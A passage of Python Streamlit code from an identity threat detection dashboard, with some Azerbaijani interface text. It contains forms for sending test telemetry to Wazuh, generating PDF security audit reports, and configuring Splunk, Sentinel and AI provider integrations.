                        for d in fail_details:
                            st.code(d)
    else:
        st.info("No threats to dispatch.")

# TAB 7: SIEM Integration Test
elif selected_menu == "⚙️ SIEM Integration Test":
    st.header("Manual Telemetry Injection")
    col1, col2 = st.columns(2)
    with col1:
        target_user = st.text_input("Target User", value="john_doe")
        source_ip = st.text_input("Source IP", value="10.0.0.45")
    with col2:
        event_type = st.selectbox("Event Type", ["Brute Force Attack", "Kerberoasting", "Golden Ticket Misuse"])
        severity = st.selectbox("Severity", ["LOW", "MEDIUM", "HIGH", "CRITICAL"], index=2)

    if st.button("Send Live Telemetry"):
        if require_login(key="manual_telemetry", message="🔐 Manual telemetriya göndərmək üçün daxil olmalısınız."):
            test_payload = {
                "timestamp": datetime.utcnow().isoformat() + "Z",
                "user": target_user, "source_ip": source_ip,
                "rule_title": event_type, "severity": severity, "source": "Argus-ITDR-ManualTest"
            }
            ok, res = send_to_wazuh(test_payload)
            if ok:
                st.success("✅ Log written to the Argus log bridge — check the Wazuh manager alerts to confirm ingestion.")
                st.json(test_payload)
            else:
                st.error(f"❌ Failed: {res}")

# TAB 8: Security Audit Report Generator
elif selected_menu == "📄 Security Audit Report":
    st.header("📄 Automated PDF Security Audit Report Generator")
    st.caption("Generate an official, executive-ready PDF Audit Report containing attack telemetry, risk scoring, and remediation history.")

    if 'df' in st.session_state and not st.session_state['df'].empty:
        df = st.session_state['df']
        resolved_users = st.session_state.get('resolved_users', set())

        cols = detect_columns(df)
        event_col = cols["event"]
        failed_attempts = len(df[df[event_col].astype(str).str.contains('4625')]) if event_col else len(df)
        compromised_attempts = len(df[df[event_col].astype(str).str.contains('4624')]) if event_col else 0
        active_failures = max(0, failed_attempts - len(resolved_users))
        active_compromised = max(0, compromised_attempts - len(resolved_users))
        posture_score = max(0, 100 - (active_failures * 10) - (active_compromised * 20))

        st.subheader("📋 Report Content Preview Summary")

        c1, c2, c3, c4 = st.columns(4)
        with c1:
            st.info(f"**Total Events Included:** {len(df)}")
        with c2:
            st.error(f"**Failed Attempts:** {failed_attempts}")
        with c3:
            st.error(f"**Compromised Accounts:** {compromised_attempts}")
        with c4:
            st.success(f"**Remediated Accounts:** {len(resolved_users)}")

        st.markdown("---")
        st.subheader("🗂️ Included Telemetry Preview (with Timestamp)")
        st.dataframe(ensure_timestamp_column(df), use_container_width=True)

        st.markdown("---")
        st.subheader("📥 Export Audit Report")

        pdf_bytes = generate_pdf_report(df, resolved_users, posture_score)

        timestamp_str = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"Argus_ITDR_Security_Report_{timestamp_str}.pdf"

        st.download_button(
            label="📄 Download Official PDF Security Audit Report",
            data=pdf_bytes,
            file_name=filename,
            mime="application/pdf",
            use_container_width=True
        )
    else:
        st.warning("⚠️ No simulation data or telemetry available to build a report. Run Red Team simulations or upload logs first.")

# TAB 9: Integrations & SIEM Settings
elif selected_menu == "🔌 Integrations":
    st.header("🔌 Integrations & SIEM Settings")
    st.caption(
        "SIEM platformaları və AI/LLM provayderlərinin qoşulma parametrlərini "
        "kod dəyişmədən, birbaşa buradan idarə edin. Baxış sərbəstdir, dəyişiklik üçün giriş tələb olunur."
    )

    if not db_is_configured():
        st.error(
            "❌ Supabase qoşulmayıb (`SUPABASE_URL`/`SUPABASE_KEY` boşdur) — "
            "inteqrasiya konfiqurasiyası saxlanıla/oxuna bilmir."
        )
    else:
        _is_auth = st.session_state.get("authenticated", False)

        def _status_badge(enabled: bool, configured: bool, source_label: str = None) -> str:
            if enabled and configured:
                label = f"🟢 Aktiv" + (f" — mənbə: {source_label}" if source_label else "")
            elif configured:
                label = "🟡 Konfiqurasiya edilib, lakin söndürülüb"
            else:
                label = "🔴 Konfiqurasiya edilməyib"
            return label

        siem_tab, ai_tab = st.tabs(["🛡️ SIEM İnteqrasiyaları", "🤖 AI & LLM Provider Integration"])

        # ================================================================
        # 🛡️ SIEM İNTEQRASİYALARI
        # ================================================================
        with siem_tab:
            # ---- Wazuh SIEM (MƏNTİQ TOXUNULMAYIB — yalnız vizual olaraq kart içinə alınıb) ----
            with st.container(border=True):
                st.subheader("🛡️ Wazuh SIEM")

                wazuh_row = integrations.get_integration(integrations.WAZUH_INTEGRATION_ID)
                wazuh_cfg_saved = (wazuh_row or {}).get("config") or {}
                wazuh_enabled_saved = bool((wazuh_row or {}).get("enabled", False))

                active_wazuh = integrations.get_active_wazuh_config()
                status_icon = "🟢" if active_wazuh["ingest_url"] else "🔴"
                status_text = "Aktiv" if active_wazuh["ingest_url"] else "Konfiqurasiya edilməyib"
                status_src = "⚙️ UI konfiqurasiyası" if active_wazuh["source"] == "ui" else ".env (fallback)"
                st.info(f"{status_icon} **Status:** {status_text} — mənbə: {status_src}")

                if not _is_auth:
                    st.warning("🔐 Konfiqurasiyanı dəyişmək üçün daxil olmalısınız. (Status yuxarıda hər kəsə açıqdır.)")
                    if st.button("🔓 Daxil ol", key="login_gate_integrations_wazuh"):
                        st.query_params["page"] = "login"
                        st.rerun()
                else:
                    with st.form("wazuh_integration_form"):
                        wazuh_enabled_input = st.checkbox(
                            "UI konfiqurasiyasını aktiv et (söndürülübsə `.env`-dəki dəyərlər istifadə olunur)",
                            value=wazuh_enabled_saved,
                        )
                        wazuh_url_input = st.text_input(
                            "Ingest Bridge URL",
                            value=wazuh_cfg_saved.get("ingest_url", ""),
                            placeholder="https://xxxx.ngrok-free.dev/ingest",
                            help="Boş saxlasanız və ya aşağıdakı checkbox söndürülübsə, `.env`-dəki ARGUS_INGEST_URL istifadə olunur.",
                        )
                        wazuh_token_input = st.text_input(
                            "Ingest Token (X-Argus-Token header-i)",
                            value=wazuh_cfg_saved.get("ingest_token", ""),
                            type="password",
                            placeholder="(opsional)",
                        )
                        wazuh_submit = st.form_submit_button("💾 Saxla", use_container_width=True)

                        if wazuh_submit:
                            ok, err = integrations.save_integration(
                                integrations.WAZUH_INTEGRATION_ID,
                                "Wazuh SIEM",
                                {"ingest_url": wazuh_url_input.strip(), "ingest_token": wazuh_token_input.strip()},
                                wazuh_enabled_input,
                            )
                            if ok:
                                st.success("✅ Wazuh konfiqurasiyası saxlanıldı.")
                                st.rerun()
                            else:
                                st.error(f"❌ Saxlanmadı: {err}")

            st.write("")

            # ---- Splunk HEC (YENİ — tam funksional) ----
            with st.container(border=True):
                st.subheader("🟠 Splunk HEC (HTTP Event Collector)")

                splunk_row = integrations.get_integration(integrations.SPLUNK_INTEGRATION_ID)
                splunk_cfg = (splunk_row or {}).get("config") or {}
                splunk_enabled_saved = bool((splunk_row or {}).get("enabled", False))
                st.caption(_status_badge(splunk_enabled_saved, bool(splunk_cfg.get("endpoint_url"))))

                if not _is_auth:
                    st.warning("🔐 Konfiqurasiyanı dəyişmək üçün daxil olmalısınız.")
                    if st.button("🔓 Daxil ol", key="login_gate_integrations_splunk"):
                        st.query_params["page"] = "login"
                        st.rerun()
                else:
                    with st.form("splunk_integration_form"):
                        splunk_enabled_input = st.checkbox(
                            "UI konfiqurasiyasını aktiv et", value=splunk_enabled_saved, key="splunk_enabled_cb"
                        )
                        splunk_url_input = st.text_input(
                            "HEC Endpoint URL",
                            value=splunk_cfg.get("endpoint_url", ""),
                            placeholder="https://splunk.example.com:8088",
                            key="splunk_url_input",
                        )
                        splunk_token_input = st.text_input(
                            "HEC Token",
                            value=splunk_cfg.get("hec_token", ""),
                            type="password",
                            placeholder="(Splunk Settings → Data Inputs → HTTP Event Collector)",
                            key="splunk_token_input",
                        )
                        splunk_index_input = st.text_input(
                            "İndeks adı",
                            value=splunk_cfg.get("index", ""),
                            placeholder="main",
                            key="splunk_index_input",
                        )
                        col_save, col_test = st.columns(2)
                        with col_save:
                            splunk_submit = st.form_submit_button("💾 Saxla", use_container_width=True)
                        with col_test:
                            splunk_test_clicked = st.form_submit_button("🔌 Test Connection", use_container_width=True)

                        if splunk_submit:
                            ok, err = integrations.save_integration(
                                integrations.SPLUNK_INTEGRATION_ID,
                                "Splunk HEC",
                                {
                                    "endpoint_url": splunk_url_input.strip(),
                                    "hec_token": splunk_token_input.strip(),
                                    "index": splunk_index_input.strip(),
                                },
                                splunk_enabled_input,
                            )
                            if ok:
                                st.success("✅ Splunk konfiqurasiyası saxlanıldı.")
                                st.rerun()
                            else:
                                st.error(f"❌ Saxlanmadı: {err}")

                        if splunk_test_clicked:
                            with st.spinner("Splunk HEC-ə test sorğusu göndərilir..."):
                                test_ok, test_msg = integrations.test_splunk_hec(
                                    splunk_url_input.strip(), splunk_token_input.strip()
                                )
                            (st.success if test_ok else st.error)(test_msg)

            st.write("")

            # ---- Microsoft Sentinel (YENİ — tam funksional) ----
            with st.container(border=True):
                st.subheader("🔷 Microsoft Sentinel")

                sentinel_row = integrations.get_integration(integrations.SENTINEL_INTEGRATION_ID)
                sentinel_cfg = (sentinel_row or {}).get("config") or {}
                sentinel_enabled_saved = bool((sentinel_row or {}).get("enabled", False))
                st.caption(_status_badge(sentinel_enabled_saved, bool(sentinel_cfg.get("workspace_id"))))

                if not _is_auth:
                    st.warning("🔐 Konfiqurasiyanı dəyişmək üçün daxil olmalısınız.")
                    if st.button("🔓 Daxil ol", key="login_gate_integrations_sentinel"):
                        st.query_params["page"] = "login"
                        st.rerun()
                else:
                    with st.form("sentinel_integration_form"):
                        sentinel_enabled_input = st.checkbox(
                            "UI konfiqurasiyasını aktiv et", value=sentinel_enabled_saved, key="sentinel_enabled_cb"
                        )
                        sentinel_workspace_input = st.text_input(
                            "Log Analytics Workspace ID",
                            value=sentinel_cfg.get("workspace_id", ""),
                            placeholder="00000000-0000-0000-0000-000000000000",
                            key="sentinel_workspace_input",
                        )
                        sentinel_key_input = st.text_input(
                            "Shared Key (Primary/Secondary Key)",
                            value=sentinel_cfg.get("shared_key", ""),
                            type="password",
                            placeholder="(Azure Portal → Log Analytics Workspace → Agents → Shared Keys)",
                            key="sentinel_key_input",
                        )
                        sentinel_table_input = st.text_input(
                            "Custom Log Type / Table adı",
                            value=sentinel_cfg.get("log_type", "ArgusITDR"),
                            placeholder="ArgusITDR",
                            key="sentinel_table_input",
                        )
                        col_save, col_test = st.columns(2)
                        with col_save:
                            sentinel_submit = st.form_submit_button("💾 Saxla", use_container_width=True)
                        with col_test:
                            sentinel_test_clicked = st.form_submit_button("🔌 Test Connection", use_container_width=True)

                        if sentinel_submit:
                            ok, err = integrations.save_integration(
                                integrations.SENTINEL_INTEGRATION_ID,
                                "Microsoft Sentinel",
                                {
                                    "workspace_id": sentinel_workspace_input.strip(),
                                    "shared_key": sentinel_key_input.strip(),
                                    "log_type": sentinel_table_input.strip() or "ArgusITDR",
                                },
                                sentinel_enabled_input,
                            )
                            if ok:
                                st.success("✅ Sentinel konfiqurasiyası saxlanıldı.")
                                st.rerun()
                            else:
                                st.error(f"❌ Saxlanmadı: {err}")

                        if sentinel_test_clicked:
                            with st.spinner("Microsoft Sentinel-ə test yazısı göndərilir..."):
                                test_ok, test_msg = integrations.test_sentinel(
                                    sentinel_workspace_input.strip(), sentinel_key_input.strip()
                                )
                            (st.success if test_ok else st.error)(test_msg)

        # ================================================================
        # 🤖 AI & LLM PROVIDER INTEGRATION (YENİ)
        # ================================================================
        with ai_tab:
            st.caption(
                "⚠️ **Runtime qeydi:** AI Sigma Generator və AI Köməkçi hazırda YALNIZ "
                f"`.env`/Secrets-dəki `AI_MODE` dəyərini (`{config.AI_MODE}`) istifadə edir. "
                "Bu bölmədəki tənzimləmələr Supabase-də saxlanılır və gələcək fazada runtime-a "
                "bağlanacaq — hazırda referans/hazırlıq məqsədlidir, heç bir mövcud davranışı DƏYİŞMİR."
            )

            active_provider_row = integrations.get_integration(integrations.AI_ACTIVE_PROVIDER_ID)
            active_provider_saved = (active_provider_row or {}).get("config", {}).get("provider", "groq")

            provider_labels = {"groq": "⚡ Groq Cloud AI", "openai": "🧠 OpenAI", "local": "🖥️ Ollama / Local"}
            provider_keys = list(provider_labels.keys())

            if _is_auth:
                selected_provider = st.selectbox(
                    "📌 Üstünlük verilən AI Rejimi (Supabase-də saxlanılır)",
                    options=provider_keys,
                    index=provider_keys.index(active_provider_saved) if active_provider_saved in provider_keys else 0,
                    format_func=lambda k: provider_labels[k],
                    key="ai_active_provider_select",
                )
                if st.button("💾 Üstünlüyü saxla", key="ai_active_provider_save"):
                    ok, err = integrations.save_integration(
                        integrations.AI_ACTIVE_PROVIDER_ID, "Active AI Provider",
                        {"provider": selected_provider}, True,
                    )
                    (st.success("✅ Saxlanıldı.") if ok else st.error(f"❌ {err}"))
            else:
                st.info(f"📌 Hazırkı saxlanılan üstünlük: **{provider_labels.get(active_provider_saved, active_provider_saved)}**")

            st.markdown("---")

            # ---- Groq Cloud AI ----
            with st.container(border=True):
                st.subheader("⚡ Groq Cloud AI")
                groq_row = integrations.get_integration(integrations.AI_GROQ_ID)
                groq_cfg = (groq_row or {}).get("config") or {}
                groq_enabled_saved = bool((groq_row or {}).get("enabled", False))
                is_runtime_active = config.AI_MODE not in ("local",) and bool(config.LLM_API_KEY or config.OPENAI_API_KEY)
                st.caption(
                    _status_badge(groq_enabled_saved, bool(groq_cfg.get("api_key")))
                    + ("  •  🟢 hazırda runtime-da aktivdir (.env)" if config.AI_MODE == "groq" else "")
                )

                if not _is_auth:
                    st.warning("🔐 Konfiqurasiyanı dəyişmək üçün daxil olmalısınız.")
                else:
                    with st.form("groq_integration_form"):
                        groq_enabled_input = st.checkbox("UI konfiqurasiyasını aktiv et", value=groq_enabled_saved, key="groq_enabled_cb")
                        groq_base_url_input = st.text_input(
                            "Base URL", value=groq_cfg.get("base_url", "https://api.groq.com/openai/v1"), key="groq_base_url_input"
                        )
                        groq_api_key_input = st.text_input(
                            "API Key", value=groq_cfg.get("api_key", ""), type="password",
                            placeholder="gsk_...", key="groq_api_key_input"
                        )
                        groq_model_input = st.text_input(
                            "Model", value=groq_cfg.get("model", "llama-3.3-70b-versatile"), key="groq_model_input"
                        )
                        col_save, col_test = st.columns(2)
                        with col_save:
                            groq_submit = st.form_submit_button("💾 Saxla", use_container_width=True)
                        with col_test:
                            groq_test_clicked = st.form_submit_button("🔌 Test Connection", use_container_width=True)

                        if groq_submit:
                            ok, err = integrations.save_integration(
                                integrations.AI_GROQ_ID, "Groq Cloud AI",
                                {
                                    "base_url": groq_base_url_input.strip(),
                                    "api_key": groq_api_key_input.strip(),
                                    "model": groq_model_input.strip(),
                                },
                                groq_enabled_input,
                            )
                            (st.success("✅ Groq konfiqurasiyası saxlanıldı.") if ok else st.error(f"❌ Saxlanmadı: {err}"))
                            if ok:
                                st.rerun()

                        if groq_test_clicked:
                            with st.spinner("Groq API-yə test sorğusu göndərilir..."):
                                test_ok, test_msg = integrations.test_groq(
                                    groq_api_key_input.strip(), groq_base_url_input.strip(), groq_model_input.strip()
                                )
                            (st.success if test_ok else st.error)(test_msg)

            st.write("")

            # ---- OpenAI ----
            with st.container(border=True):
                st.subheader("🧠 OpenAI")
                openai_row = integrations.get_integration(integrations.AI_OPENAI_ID)
                openai_cfg = (openai_row or {}).get("config") or {}
                openai_enabled_saved = bool((openai_row or {}).get("enabled", False))
                st.caption(
                    _status_badge(openai_enabled_saved, bool(openai_cfg.get("api_key")))
                    + ("  •  🟢 hazırda runtime-da aktivdir (.env)" if config.AI_MODE not in ("local", "groq") else "")
                )

                if not _is_auth:
                    st.warning("🔐 Konfiqurasiyanı dəyişmək üçün daxil olmalısınız.")
                else:
                    with st.form("openai_integration_form"):
                        openai_enabled_input = st.checkbox("UI konfiqurasiyasını aktiv et", value=openai_enabled_saved, key="openai_enabled_cb")
                        openai_api_key_input = st.text_input(
                            "API Key", value=openai_cfg.get("api_key", ""), type="password",
                            placeholder="sk-...", key="openai_api_key_input"
                        )
                        openai_model_input = st.text_input(
                            "Model", value=openai_cfg.get("model", "gpt-4o-mini"), key="openai_model_input"
                        )
                        col_save, col_test = st.columns(2)
                        with col_save:
                            openai_submit = st.form_submit_button("💾 Saxla", use_container_width=True)
                        with col_test:
                            openai_test_clicked = st.form_submit_button("🔌 Test Connection", use_container_width=True)

                        if openai_submit:
                            ok, err = integrations.save_integration(
                                integrations.AI_OPENAI_ID, "OpenAI",
                                {"api_key": openai_api_key_input.strip(), "model": openai_model_input.strip()},
                                openai_enabled_input,
                            )
                            (st.success("✅ OpenAI konfiqurasiyası saxlanıldı.") if ok else st.error(f"❌ Saxlanmadı: {err}"))
                            if ok:
                                st.rerun()

                        if openai_test_clicked:
                            with st.spinner("OpenAI API-yə test sorğusu göndərilir..."):
                                test_ok, test_msg = integrations.test_openai(
                                    openai_api_key_input.strip(), openai_model_input.strip()
                                )
                            (st.success if test_ok else st.error)(test_msg)

            st.write("")

            # ---- Ollama / Local LLM ----
            with st.container(border=True):
                st.subheader("🖥️ Ollama / Local LLM")
                ollama_row = integrations.get_integration(integrations.AI_OLLAMA_ID)
                ollama_cfg = (ollama_row or {}).get("config") or {}
                ollama_enabled_saved = bool((ollama_row or {}).get("enabled", False))
                st.caption(
                    _status_badge(ollama_enabled_saved, bool(ollama_cfg.get("host")))
                    + ("  •  🟢 hazırda runtime-da aktivdir (.env)" if config.AI_MODE == "local" else "")
                )

                if not _is_auth:
                    st.warning("🔐 Konfiqurasiyanı dəyişmək üçün daxil olmalısınız.")
                else:
                    with st.form("ollama_integration_form"):
                        ollama_enabled_input = st.checkbox("UI konfiqurasiyasını aktiv et", value=ollama_enabled_saved, key="ollama_enabled_cb")
                        ollama_host_input = st.text_input(
                            "Host URL", value=ollama_cfg.get("host", "http://localhost:11434"), key="ollama_host_input"
                        )
                        ollama_model_input = st.text_input(
                            "Model adı", value=ollama_cfg.get("model", "llama3"), key="ollama_model_input"
                        )
                        col_save, col_test = st.columns(2)
                        with col_save:
                            ollama_submit = st.form_submit_button("💾 Saxla", use_container_width=True)
                        with col_test:
                            ollama_test_clicked = st.form_submit_button("🔌 Test Connection", use_container_width=True)

                        if ollama_submit:
                            ok, err = integrations.save_integration(
                                integrations.AI_OLLAMA_ID, "Ollama / Local LLM",
                                {"host": ollama_host_input.strip(), "model": ollama_model_input.strip()},
                                ollama_enabled_input,
                            )
                            (st.success("✅ Ollama konfiqurasiyası saxlanıldı.") if ok else st.error(f"❌ Saxlanmadı: {err}"))
                            if ok:
                                st.rerun()

                        if ollama_test_clicked:
                            with st.spinner("Ollama-ya test sorğusu göndərilir..."):
                                test_ok, test_msg = integrations.test_ollama(
                                    ollama_host_input.strip(), ollama_model_input.strip()
                                )
                            (st.success if test_ok else st.error)(test_msg)